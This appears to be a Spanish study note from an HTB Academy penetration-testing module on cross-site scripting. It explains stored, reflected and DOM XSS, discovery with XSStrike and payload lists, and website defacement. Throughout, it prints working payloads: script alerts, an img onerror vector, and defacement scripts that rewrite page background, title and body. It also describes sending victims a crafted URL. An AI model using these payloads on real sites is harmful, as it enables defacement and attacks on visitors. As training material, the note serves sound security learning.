---
tags:
  - HTB-Academy
  - Penetration-Tester
---

# Introducción

A medida que las aplicaciones web se vuelven más avanzadas y más comunes, también lo hacen las vulnerabilidades de las aplicaciones web. Entre los tipos más comunes de vulnerabilidades de aplicaciones web se encuentran [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) vulnerabilidades. Las vulnerabilidades XSS aprovechan una falla en la desinfección de entrada del usuario para "escribir" el código JavaScript en la página y ejecutarlo en el lado del cliente, lo que lleva a varios tipos de ataques.

---

## Qué es XSS

Una aplicación web típica funciona al recibir el código HTML del servidor de back-end y renderizarlo en el navegador de Internet del lado del cliente. Cuando una aplicación web vulnerable no desinfecta adecuadamente la entrada del usuario, un usuario malicioso puede inyectar código JavaScript adicional en un campo de entrada (por ejemplo, comentario/respuesta), por lo que una vez que otro usuario ve la misma página, sin saberlo, ejecuta el código JavaScript malicioso.

Las vulnerabilidades XSS se ejecutan únicamente en el lado del cliente y, por lo tanto, no afectan directamente al servidor de back-end. Solo pueden afectar al usuario que ejecuta la vulnerabilidad. El impacto directo de las vulnerabilidades XSS en el servidor de back-end puede ser relativamente bajo, pero se encuentran muy comúnmente en las aplicaciones web, por lo que esto equivale a un riesgo medio (`low impact + high probability = medium risk`), que siempre debemos intentar `reduce` riesgo al detectar, remediar y prevenir proactivamente este tipo de vulnerabilidades.

![riesgo xss](https://academy.hackthebox.com/storage/modules/103/xss_risk_chart_1.jpg)

---

## Ataques XSS

Las vulnerabilidades XSS pueden facilitar una amplia gama de ataques, que pueden ser cualquier cosa que se pueda ejecutar a través del código JavaScript del navegador. Un ejemplo básico de un ataque XSS es hacer que el usuario objetivo envíe involuntariamente su cookie de sesión al servidor web del atacante. Otro ejemplo es hacer que el navegador del objetivo ejecute llamadas API que conduzcan a una acción maliciosa, como cambiar la contraseña del usuario a una contraseña de la elección del atacante. Hay muchos otros tipos de ataques XSS, desde la minería de Bitcoin hasta la visualización de anuncios.

Como los ataques XSS ejecutan código JavaScript dentro del navegador, están limitados al motor JS del navegador (es decir, V8 en Chrome). No pueden ejecutar código JavaScript en todo el sistema para hacer algo como la ejecución de código a nivel de sistema. En los navegadores modernos, también se limitan al mismo dominio del sitio web vulnerable. Sin embargo, poder ejecutar JavaScript en el navegador de un usuario aún puede conducir a una amplia variedad de ataques, como se mencionó anteriormente. Además de esto, si un investigador experto identifica una vulnerabilidad binaria en un navegador web (por ejemplo, un desbordamiento de memoria dinámica en Chrome), puede utilizar una vulnerabilidad XSS para ejecutar un exploit de JavaScript en el navegador del objetivo, que eventualmente sale del sandbox del navegador y ejecuta código en la máquina del usuario.

Las vulnerabilidades XSS se pueden encontrar en casi todas las aplicaciones web modernas y se han explotado activamente durante las últimas dos décadas. Un ejemplo de XSS bien conocido es el [Gusano Samy](https://en.wikipedia.org/wiki/Samy_\(computer_worm\)), que era un gusano basado en navegador que explotaba una vulnerabilidad XSS almacenada en el sitio web de redes sociales MySpace en 2005. Se ejecutó al ver una página web infectada publicando un mensaje en la página MySpace de la víctima que decía, "Samy es mi héroe." El mensaje en sí también contenía la misma carga útil de JavaScript para volver a publicar el mismo mensaje cuando lo veían otros. En un solo día, más de un millón de usuarios de MySpace publicaron este mensaje en sus páginas. A pesar de que esta carga útil específica no causó ningún daño real, la vulnerabilidad podría haberse utilizado para fines mucho más nefastos, como robar información de tarjetas de crédito de los usuarios, instalar registradores de claves en sus navegadores o incluso explotar una vulnerabilidad binaria en los navegadores web del usuario (que era más común en los navegadores web en ese entonces).

En 2014, un investigador de seguridad identificó accidentalmente un [Vulnerabilidad XSS](https://blog.sucuri.net/2014/06/serious-cross-site-scripting-vulnerability-in-tweetdeck-twitter.html) en el panel TweetDeck de Twitter. Esta vulnerabilidad fue explotada para crear un [tuit de auto-retuiteo](https://twitter.com/derGeruhn/status/476764918763749376) en Twitter, lo que llevó al tweet a ser retuiteado más de 38.000 veces en menos de dos minutos. Finalmente, obligó a Twitter a [cierre temporalmente TweetDeck](https://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable) mientras parcheaban la vulnerabilidad.

Hasta el día de hoy, incluso las aplicaciones web más destacadas tienen vulnerabilidades XSS que pueden ser explotadas. Incluso la página del motor de búsqueda de Google tenía múltiples vulnerabilidades XSS en su barra de búsqueda, la más reciente de las cuales estaba en [2019](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/) cuando se encontró una vulnerabilidad XSS en la biblioteca XML. Además, el Apache Server, el servidor web más utilizado en Internet, una vez informó un [Vulnerabilidad XSS](https://blogs.apache.org/infra/entry/apache_org_04_09_2010) eso estaba siendo explotado activamente para robar contraseñas de usuario de ciertas compañías. Todo esto nos dice que las vulnerabilidades XSS deben tomarse en serio, y se debe hacer un buen esfuerzo para detectarlas y prevenirlas.

---

## Tipos de XSS

Hay tres tipos principales de vulnerabilidades XSS:

|Tipo|Descripción|
|---|---|
|`Stored (Persistent) XSS`|El tipo más crítico de XSS, que ocurre cuando la entrada del usuario se almacena en la base de datos de back-end y luego se muestra al recuperarla (por ejemplo, publicaciones o comentarios)|
|`Reflected (Non-Persistent) XSS`|Ocurre cuando la entrada del usuario se muestra en la página después de ser procesada por el servidor de backend, pero sin ser almacenada (por ejemplo, resultado de búsqueda o mensaje de error)|
|`DOM-based XSS`|Otro tipo XSS no persistente que se produce cuando la entrada del usuario se muestra directamente en el navegador y se procesa completamente en el lado del cliente, sin llegar al servidor de back-end (por ejemplo, a través de parámetros HTTP del lado del cliente o etiquetas de anclaje)|

Cubriremos cada uno de estos tipos en las próximas secciones y trabajaremos a través de ejercicios para ver cómo ocurre cada uno de ellos, y luego también veremos cómo cada uno de ellos puede ser utilizado en ataques.


# Almacenado XSS

---

Antes de aprender cómo descubrir vulnerabilidades XSS y utilizarlas para varios ataques, primero debemos entender los diferentes tipos de vulnerabilidades XSS y sus diferencias para saber cuál usar en cada tipo de ataque.

El primer y más crítico tipo de vulnerabilidad XSS es `Stored XSS` o `Persistent XSS`. Si nuestra carga útil XSS inyectada se almacena en la base de datos de back-end y se recupera al visitar la página, esto significa que nuestro ataque XSS es persistente y puede afectar a cualquier usuario que visite la página.

Esto hace que este tipo de XSS sea el más crítico, ya que afecta a un público mucho más amplio ya que cualquier usuario que visite la página sería víctima de este ataque. Además, el XSS almacenado puede no ser fácilmente extraíble, y la carga útil puede necesitar ser eliminada de la base de datos de back-end.

Podemos iniciar el servidor a continuación para ver y practicar un ejemplo de XSS almacenado. Como podemos ver, la página web es una simple `To-Do List` aplicación a la que podemos agregar elementos. Podemos intentar escribir `test` y presionando enter/return para agregar un nuevo elemento y ver cómo la página lo maneja:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss.jpg)

Como podemos ver, nuestra entrada se mostró en la página. Si no se aplicó desinfección o filtrado a nuestra entrada, la página podría ser vulnerable a XSS.

---

## Cargas útiles de prueba XSS

Podemos probar si la página es vulnerable a XSS con la siguiente carga útil básica de XSS:

Código: html

```html
<script>alert(window.origin)</script>
```

Utilizamos esta carga útil, ya que es un método muy fácil de detectar para saber cuándo se ha ejecutado con éxito nuestra carga útil XSS. Supongamos que la página permite cualquier entrada y no realiza ninguna desinfección en ella. En ese caso, la alerta debe aparecer con la URL de la página en la que se está ejecutando, directamente después de ingresar nuestra carga útil o cuando actualizamos la página:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg)

Como podemos ver, de hecho recibimos la alerta, lo que significa que la página es vulnerable a XSS, ya que nuestra carga útil se ejecutó con éxito. Podemos confirmar esto más adelante mirando la fuente de la página haciendo clic en [`CTRL+U`] o haciendo clic derecho y seleccionando `View Page Source`y deberíamos ver nuestra carga útil en la fuente de la página:

Código: html

```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>
```

**Consejo:** Muchas aplicaciones web modernas utilizan IFrames de dominio cruzado para manejar la entrada del usuario, de modo que incluso si el formulario web es vulnerable a XSS, no sería una vulnerabilidad en la aplicación web principal. Es por eso que estamos mostrando el valor de `window.origin` en el cuadro de alerta, en lugar de un valor estático como `1`. En este caso, el cuadro de alerta revelaría la URL en la que se está ejecutando y confirmará qué formulario es el vulnerable, en caso de que se esté utilizando un IFrame.

Como algunos navegadores modernos pueden bloquear el `alert()` Función JavaScript en ubicaciones específicas, puede ser útil conocer algunas otras cargas útiles XSS básicas para verificar la existencia de XSS. Una de esas cargas útiles XSS es `<plaintext>`, que dejará de representar el código HTML que viene después y lo mostrará como texto sin formato. Otra carga útil fácil de detectar es `<script>print()</script>` eso abrirá el cuadro de diálogo de impresión del navegador, que es poco probable que sea bloqueado por cualquier navegador. Intente usar estas cargas útiles para ver cómo funciona cada una. Puede usar el botón de reinicio para eliminar cualquier carga útil actual.

Para ver si la carga útil es persistente y se almacena en el back-end, podemos actualizar la página y ver si recibimos la alerta nuevamente. Si lo hacemos, veríamos que seguimos recibiendo la alerta incluso a lo largo de las actualizaciones de la página, confirmando que esto es realmente un `Stored/Persistent XSS` vulnerabilidad. Esto no es exclusivo para nosotros, ya que cualquier usuario que visite la página activará la carga útil XSS y recibirá la misma alerta.


# XSS reflejado

---

Hay dos tipos de `Non-Persistent XSS` vulnerabilidades: `Reflected XSS`, que es procesado por el servidor de back-end, y `DOM-based XSS`, que se procesa completamente en el lado del cliente y nunca llega al servidor de back-end. A diferencia de Persistent XSS, `Non-Persistent XSS` las vulnerabilidades son temporales y no son persistentes a través de las actualizaciones de la página. Por lo tanto, nuestros ataques solo afectan al usuario objetivo y no afectarán a otros usuarios que visiten la página.

`Reflected XSS` las vulnerabilidades ocurren cuando nuestra entrada llega al servidor de back-end y nos es devuelta sin ser filtrada o desinfectada. Hay muchos casos en los que toda nuestra entrada puede ser devuelta a nosotros, como mensajes de error o mensajes de confirmación. En estos casos, podemos intentar usar cargas útiles XSS para ver si se ejecutan. Sin embargo, como estos suelen ser mensajes temporales, una vez que nos movemos de la página, no volverían a ejecutarse, y por lo tanto lo son `Non-Persistent`.

Podemos iniciar el servidor a continuación para practicar en una página web vulnerable a una vulnerabilidad XSS reflejada. Es similar `To-Do List` aplicación a la que practicamos en la sección anterior. Podemos intentar agregar cualquiera `test` cadena para ver cómo se maneja:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_reflected_1.jpg)

Como podemos ver, obtenemos `Task 'test' could not be added.`, que incluye nuestra entrada `test` como parte del mensaje de error. Si nuestra entrada no se filtró o desinfectó, la página podría ser vulnerable a XSS. Podemos probar la misma carga útil XSS que usamos en la sección anterior y hacer clic `Add`:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_reflected_2.jpg)

Una vez que hacemos clic `Add`, obtenemos la ventana emergente de alerta:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg)

En este caso, vemos que el mensaje de error ahora dice `Task '' could not be added.`. Ya que nuestra carga útil está envuelta con un `<script>` etiqueta, no es renderizado por el navegador, por lo que obtenemos cotizaciones únicas vacías `''` en cambio. Una vez más podemos ver la fuente de la página para confirmar que el mensaje de error incluye nuestra carga útil XSS:

Código: html

```html
<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>
```

Como podemos ver, las cotizaciones individuales contienen nuestra carga útil XSS `'<script>alert(window.origin)</script>'`.

Si visitamos el `Reflected` página de nuevo, el mensaje de error ya no aparece, y nuestra carga útil XSS no se ejecuta, lo que significa que esta vulnerabilidad XSS es de hecho `Non-Persistent`.

`But if the XSS vulnerability is Non-Persistent, how would we target victims with it?`

Esto depende de qué solicitud HTTP se utiliza para enviar nuestra entrada al servidor. Podemos comprobar esto a través de Firefox `Developer Tools` haciendo clic en [`CTRL+Shift+I`] y seleccionando el `Network` pestaña. Entonces, podemos poner nuestro `test` carga útil de nuevo y haga clic `Add` para enviarlo:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_reflected_network.jpg)

Como podemos ver, la primera fila muestra que nuestra solicitud fue una `GET` solicitar. `GET` la solicitud envía sus parámetros y datos como parte de la URL. Entonces, `to target a user, we can send them a URL containing our payload`. Para obtener la URL, podemos copiar la URL de la barra de URL en Firefox después de enviar nuestra carga útil XSS, o podemos hacer clic derecho en la `GET` solicitud en el `Network` pestaña y seleccione `Copy>Copy URL`. Una vez que la víctima visita esta URL, la carga útil XSS se ejecutaría:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg)


# XSS DOM

---

El tercer y último tipo de XSS es otro `Non-Persistent` tipo llamado `DOM-based XSS`. Mientras `reflected XSS` envía los datos de entrada al servidor de back-end a través de solicitudes HTTP, DOM XSS se procesa completamente en el lado del cliente a través de JavaScript. DOM XSS ocurre cuando JavaScript se usa para cambiar el origen de la página a través del `Document Object Model (DOM)`.

Podemos ejecutar el servidor a continuación para ver un ejemplo de una aplicación web vulnerable a DOM XSS. Podemos intentar agregar un `test` elemento, y vemos que la aplicación web es similar a la `To-Do List` aplicaciones web que utilizamos anteriormente:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_dom_1.jpg)

Sin embargo, si abrimos el `Network` pestaña en las Herramientas para desarrolladores de Firefox y vuelva a agregar el `test` item, notaríamos que no se están realizando solicitudes HTTP:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_dom_network.jpg)

Vemos que el parámetro de entrada en la URL está utilizando un hashtag `#` para el elemento que agregamos, lo que significa que este es un parámetro del lado del cliente que se procesa completamente en el navegador. Esto indica que la entrada se está procesando en el lado del cliente a través de JavaScript y nunca llega al back-end; por lo tanto, es un `DOM-based XSS`.

Además, si miramos la fuente de la página presionando [`CTRL+U`], notaremos que nuestro `test` la cuerda no se encuentra en ninguna parte. Esto se debe a que el código JavaScript está actualizando la página cuando hacemos clic en `Add` botón, que es después de que el navegador recupera la fuente de la página, por lo tanto, la fuente de la página base no mostrará nuestra entrada, y si actualizamos la página, no se conservará (es decir. `Non-Persistent`). Todavía podemos ver la fuente de la página renderizada con la herramienta Inspector web haciendo clic en [`CTRL+SHIFT+C`]:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_dom_inspector.jpg)

---

## Fuente y Fregadero

Para comprender mejor la naturaleza de la vulnerabilidad XSS basada en DOM, debemos comprender el concepto de `Source` y `Sink` del objeto mostrado en la página. El `Source` es el objeto JavaScript que toma la entrada del usuario, y puede ser cualquier parámetro de entrada como un parámetro de URL o un campo de entrada, como vimos anteriormente.

Por otro lado, el `Sink` es la función que escribe la entrada del usuario en un objeto DOM en la página. Si el `Sink` la función no desinfecta adecuadamente la entrada del usuario, sería vulnerable a un ataque XSS. Algunas de las funciones de JavaScript comúnmente utilizadas para escribir en objetos DOM son:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Además, algunos de los `jQuery` las funciones de biblioteca que escriben en objetos DOM son:

- `add()`
- `after()`
- `append()`

Si a `Sink` la función escribe la entrada exacta sin ningún tipo de desinfección (como las funciones anteriores), y no se utilizaron otros medios de desinfección, entonces sabemos que la página debe ser vulnerable a XSS.

Podemos ver el código fuente de la `To-Do` aplicación web, y comprobar `script.js`y veremos que el `Source` está siendo tomado de la `task=` parámetro:

Código: javascript

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

Justo debajo de estas líneas, vemos que la página utiliza el `innerHTML` función para escribir el `task` variable en el `todo` DOM:

Código: javascript

```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

Por lo tanto, podemos ver que podemos controlar la entrada, y la salida no se está desinfectando, por lo que esta página debe ser vulnerable a DOM XSS.

---

## Ataques DOM

Si probamos la carga útil XSS que hemos estado usando anteriormente, veremos que no se ejecutará. Esto es porque el `innerHTML` la función no permite el uso de la `<script>` etiquetas dentro de él como una característica de seguridad. Aún así, hay muchas otras cargas útiles XSS que utilizamos que no contienen `<script>` etiquetas, como la siguiente carga útil XSS:

Código: html

```html
<img src="" onerror=alert(window.origin)>
```

La línea anterior crea un nuevo objeto de imagen HTML, que tiene un `onerror` atributo que puede ejecutar código JavaScript cuando no se encuentra la imagen. Entonces, como proporcionamos un enlace de imagen vacío (`""`), nuestro código siempre debe ejecutarse sin tener que usarlo `<script>` etiquetas:

    '>

![](https://academy.hackthebox.com/storage/modules/103/xss_dom_alert.jpg)

Para dirigirnos a un usuario con esta vulnerabilidad DOM XSS, podemos volver a copiar la URL del navegador y compartirla con ellos, y una vez que la visiten, el código JavaScript debería ejecutarse. Ambas cargas útiles se encuentran entre las cargas útiles XSS más básicas. Hay muchos casos en los que es posible que necesitemos usar varias cargas útiles dependiendo de la seguridad de la aplicación web y el navegador, que discutiremos en la siguiente sección.


# XSS Descubrimiento

---

Por ahora, deberíamos tener una buena comprensión de qué es una vulnerabilidad XSS, los tres tipos de XSS y cómo cada tipo difiere de los demás. También debemos entender cómo funciona XSS mediante la inyección de código JavaScript en la fuente de la página del lado del cliente, ejecutando así código adicional, que luego aprenderemos a utilizar para nuestro beneficio.

En esta sección, pasaremos por varias formas de detectar vulnerabilidades XSS dentro de una aplicación web. En las vulnerabilidades de las aplicaciones web (y todas las vulnerabilidades en general), detectarlas puede ser tan difícil como explotarlas. Sin embargo, como las vulnerabilidades XSS están muy extendidas, muchas herramientas pueden ayudarnos a detectarlas e identificarlas.

---

## Descubrimiento Automatizado

Casi todos los Escáneres de Vulnerabilidad de Aplicaciones Web (como [Nessus](https://www.tenable.com/products/nessus), [Pro Burp](https://portswigger.net/burp/pro), o [ZAP](https://www.zaproxy.org/)) tienen varias capacidades para detectar los tres tipos de vulnerabilidades XSS. Estos escáneres suelen hacer dos tipos de escaneo: Un Escaneo Pasivo, que revisa el código del lado del cliente en busca de posibles vulnerabilidades basadas en DOM, y un Escaneo Activo, que envía varios tipos de cargas útiles para intentar activar un XSS a través de la inyección de carga útil en la fuente de la página.

Si bien las herramientas de pago generalmente tienen un mayor nivel de precisión en la detección de vulnerabilidades XSS (especialmente cuando se requieren omisiones de seguridad), aún podemos encontrar herramientas de código abierto que pueden ayudarnos a identificar posibles vulnerabilidades XSS. Dichas herramientas generalmente funcionan identificando campos de entrada en páginas web, enviando varios tipos de cargas útiles XSS y luego comparando la fuente de la página renderizada para ver si se puede encontrar la misma carga útil en ella, lo que puede indicar una inyección XSS exitosa. Aún así, esto no siempre será preciso, ya que a veces, incluso si se inyectó la misma carga útil, es posible que no conduzca a una ejecución exitosa debido a varias razones, por lo que siempre debemos verificar manualmente la inyección XSS.

Algunas de las herramientas comunes de código abierto que pueden ayudarnos en el descubrimiento de XSS son [XSS Huelga](https://github.com/s0md3v/XSStrike), [Bruto XSS](https://github.com/rajeshmajumdar/BruteXSS), y [XSSer](https://github.com/epsylon/xsser). Podemos intentarlo `XSS Strike` clonándolo a nuestra VM con `git clone`:

  XSS Descubrimiento

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
vcrdcr@htb[/htb]$ cd XSStrike
vcrdcr@htb[/htb]$ pip install -r requirements.txt
vcrdcr@htb[/htb]$ python xsstrike.py

XSStrike v3.1.4
...SNIP...
```

Luego podemos ejecutar el script y proporcionarle una URL con un parámetro usando `-u`. Intentemos usarlo con nuestro `Reflected XSS` ejemplo de la sección anterior:

  XSS Descubrimiento

```shell-session
vcrdcr@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

Como podemos ver, la herramienta identificó el parámetro como vulnerable a XSS desde la primera carga útil. `Try to verify the above payload by testing it on one of the previous exercises. You may also try testing out the other tools and run them on the same exercises to see how capable they are in detecting XSS vulnerabilities.`

---

## Descubrimiento Manual

Cuando se trata del descubrimiento manual de XSS, la dificultad de encontrar la vulnerabilidad de XSS depende del nivel de seguridad de la aplicación web. Las vulnerabilidades XSS básicas generalmente se pueden encontrar al probar varias cargas útiles XSS, pero identificar vulnerabilidades XSS avanzadas requiere habilidades avanzadas de revisión de código.

---

#### cargas útiles XSS

El método más básico para buscar vulnerabilidades XSS es probar manualmente varias cargas útiles XSS contra un campo de entrada en una página web determinada. Podemos encontrar enormes listas de cargas útiles XSS en línea, como la de [Carga útilAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) o el de dentro [PayloadBox](https://github.com/payloadbox/xss-payload-list). Luego podemos comenzar a probar estas cargas útiles una por una copiando cada una y agregándola en nuestro formulario, y viendo si aparece un cuadro de alerta.

Nota: XSS se puede inyectar en cualquier entrada de la página HTML, que no es exclusiva de los campos de entrada HTML, pero también puede estar en encabezados HTTP como la Cookie o User-Agent (es decir, cuando sus valores se muestran en la página).

Notará que la mayoría de las cargas útiles anteriores no funcionan con nuestras aplicaciones web de ejemplo, a pesar de que estamos lidiando con el tipo más básico de vulnerabilidades XSS. Esto se debe a que estas cargas útiles están escritas para una amplia variedad de puntos de inyección (como inyectar después de una sola cita) o están diseñadas para evadir ciertas medidas de seguridad (como filtros de desinfección). Además, tales cargas útiles utilizan una variedad de vectores de inyección para ejecutar código JavaScript, como básico `<script>` etiquetas, otros `HTML Attributes` como `<img>`, o incluso `CSS Style` atributos. Es por eso que podemos esperar que muchas de estas cargas útiles no funcionen en todos los casos de prueba, ya que están diseñadas para funcionar con ciertos tipos de inyecciones.

Es por esto que no es muy eficiente recurrir a copiar/pegar manualmente cargas útiles XSS, ya que incluso si una aplicación web es vulnerable, puede llevarnos un tiempo identificar la vulnerabilidad, especialmente si tenemos muchos campos de entrada para probar. Es por eso que puede ser más eficiente escribir nuestro propio script de Python para automatizar el envío de estas cargas útiles y luego comparar la fuente de la página para ver cómo se representaron nuestras cargas útiles. Esto puede ayudarnos en casos avanzados en los que las herramientas XSS no pueden enviar y comparar fácilmente cargas útiles. De esta manera, tendríamos la ventaja de personalizar nuestra herramienta para nuestra aplicación web de destino. Sin embargo, este es un enfoque avanzado para el descubrimiento de XSS, y no es parte del alcance de este módulo.

---

## Revisión de Código

El método más confiable para detectar vulnerabilidades XSS es la revisión manual del código, que debe cubrir el código de back-end y front-end. Si entendemos con precisión cómo se maneja nuestra entrada hasta que llegue al navegador web, podemos escribir una carga útil personalizada que debería funcionar con alta confianza.

En la sección anterior, analizamos un ejemplo básico de revisión de código HTML cuando discutimos el `Source` y `Sink` para vulnerabilidades XSS basadas en DOM. Esto nos dio un vistazo rápido a cómo funciona la revisión de código de front-end para identificar vulnerabilidades XSS, aunque en un ejemplo de front-end muy básico.

Es poco probable que encontremos vulnerabilidades XSS a través de listas de carga útil o herramientas XSS para las aplicaciones web más comunes. Esto se debe a que los desarrolladores de tales aplicaciones web probablemente ejecutan su aplicación a través de herramientas de evaluación de vulnerabilidades y luego parchean cualquier vulnerabilidad identificada antes de la versión. Para tales casos, la revisión manual del código puede revelar vulnerabilidades XSS no detectadas, que pueden sobrevivir a las versiones públicas de aplicaciones web comunes. Estas también son técnicas avanzadas que están fuera del alcance de este módulo. Aún así, si estás interesado en aprenderlos, el [Codificación segura 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) y el [Whitebox Pentesting 101: Inyección de Comando](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) los módulos cubren a fondo este tema.


# Desfigurando

---

Ahora que entendemos los diferentes tipos de XSS y varios métodos para descubrir vulnerabilidades XSS en las páginas web, podemos comenzar a aprender cómo explotar estas vulnerabilidades XSS. Como se mencionó anteriormente, el daño y el alcance de un ataque XSS depende del tipo de XSS, siendo un XSS almacenado el más crítico, mientras que un DOM basado en menos.

Uno de los ataques más comunes que generalmente se usan con vulnerabilidades XSS almacenadas son los ataques de desfiguración de sitios web. `Defacing` un sitio web significa cambiar su aspecto para cualquiera que visite el sitio web. Es muy común que los grupos de hackers desfiguren un sitio web para afirmar que lo habían pirateado con éxito, como cuando los piratas informáticos desfiguraron el Servicio Nacional de Salud del Reino Unido (NHS) [de vuelta en 2018](https://www.bbc.co.uk/news/technology-43812539). Tales ataques pueden tener un gran eco en los medios y pueden afectar significativamente las inversiones y los precios de las acciones de una empresa, especialmente para los bancos y las empresas de tecnología.

Aunque se pueden utilizar muchas otras vulnerabilidades para lograr lo mismo, las vulnerabilidades XSS almacenadas se encuentran entre las vulnerabilidades más utilizadas para hacerlo.

---

## Elementos de Desfiguración

Podemos utilizar código JavaScript inyectado (a través de XSS) para hacer que una página web se vea como queramos. Sin embargo, desfigurar un sitio web generalmente se usa para enviar un mensaje simple (es decir, lo pirateamos con éxito), por lo que darle a la página web desfigurada un aspecto hermoso no es realmente el objetivo principal.

Cuatro elementos HTML se utilizan generalmente para cambiar el aspecto principal de una página web:

- Color de Fondo `document.body.style.background`
- Antecedentes `document.body.background`
- Título de la Página `document.title`
- Texto de Página `DOM.innerHTML`

Podemos utilizar dos o tres de estos elementos para escribir un mensaje básico a la página web e incluso eliminar el elemento vulnerable, de modo que sería más difícil restablecer rápidamente la página web, como veremos a continuación.

---

## Cambiar de Fondo

Volvamos a nuestro `Stored XSS` haz ejercicio y úsalo como base para nuestro ataque. Puedes volver al `Stored XSS` sección para generar el servidor y siga los siguientes pasos.

Para cambiar el fondo de una página web, podemos elegir un determinado color o usar una imagen. Usaremos un color como fondo, ya que la mayoría de los ataques de desfiguración usan un color oscuro para el fondo. Para hacerlo, podemos usar la siguiente carga útil:

Código: html

```html
<script>document.body.style.background = "#141d2b"</script>
```

Consejo: Aquí configuramos el color de fondo en el color de fondo predeterminado Hack The Box. Podemos usar cualquier otro valor hexadecimal, o podemos usar un color con nombre como `= "black"`.

Una vez que agregamos nuestra carga útil al `To-Do` lista, veremos que el color de fondo cambió:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_defacing_background_color.jpg)

Esto será persistente a través de las actualizaciones de la página y aparecerá para cualquier persona que visite la página, ya que estamos utilizando una vulnerabilidad XSS almacenada.

Otra opción sería establecer una imagen en segundo plano utilizando la siguiente carga útil:

Código: html

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

Intente usar la carga útil anterior para ver cómo puede verse el resultado final.

---

## Cambiar el Título de la Página

Podemos cambiar el título de la página desde `2Do` a cualquier título de nuestra elección, utilizando el `document.title` Propiedad JavaScript:

Código: html

```html
<script>document.title = 'HackTheBox Academy'</script>
```

Podemos ver desde la ventana/pestaña de la página que nuestro nuevo título ha reemplazado al anterior:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_defacing_page_title.jpg)

---

## Cambiar Texto de Página

Cuando queremos cambiar el texto que se muestra en la página web, podemos utilizar varias funciones de JavaScript para hacerlo. Por ejemplo, podemos cambiar el texto de un elemento HTML/DOM específico usando el `innerHTML` propiedad:

Código: javascript

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

También podemos utilizar las funciones jQuery para lograr de manera más eficiente lo mismo o para cambiar el texto de múltiples elementos en una línea (para hacerlo, el `jQuery` la biblioteca debe haber sido importada dentro de la fuente de la página):

Código: javascript

```javascript
$("#todo").html('New Text');
```

Esto nos da varias opciones para personalizar el texto en la página web y hacer ajustes menores para satisfacer nuestras necesidades. Sin embargo, como los grupos de hacking suelen dejar un simple mensaje en la página web y no dejan nada más en ella, cambiaremos todo el código HTML de la principal `body`, usando `innerHTML`, como sigue:

Código: javascript

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Como podemos ver, podemos especificar el `body` elemento con `document.getElementsByTagName('body')`, y especificando `[0]`, estamos seleccionando el primero `body` elemento, que debe cambiar todo el texto de la página web. También podemos usar `jQuery` para lograr lo mismo. Sin embargo, antes de enviar nuestra carga útil y hacer un cambio permanente, debemos preparar nuestro código HTML por separado y luego usarlo `innerHTML` para establecer nuestro código HTML en la fuente de la página.

Para nuestro ejercicio, tomaremos prestado el código HTML de la página principal de `Hack The Box Academy`:

Código: html

```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

**Consejo:** Sería prudente intentar ejecutar nuestro código HTML localmente para ver cómo se ve y asegurarse de que se ejecute como se esperaba, antes de comprometernos con él en nuestra carga útil final.

Minificaremos el código HTML en una sola línea y lo agregaremos a nuestra carga útil XSS anterior. La carga útil final debe ser la siguiente:

Código: html

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

Una vez que agregamos nuestra carga útil a los vulnerables `To-Do` lista, veremos que nuestro código HTML es ahora permanentemente parte del código fuente de la página web y muestra nuestro mensaje para cualquiera que visite la página:

   

![](https://academy.hackthebox.com/storage/modules/103/xss_defacing_change_text.jpg)

Al usar tres cargas útiles XSS, pudimos desfigurar con éxito nuestra página web de destino. Si miramos el código fuente de la página web, veremos que el código fuente original todavía existe, y nuestras cargas útiles inyectadas aparecen al final:

Código: html

```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>
```

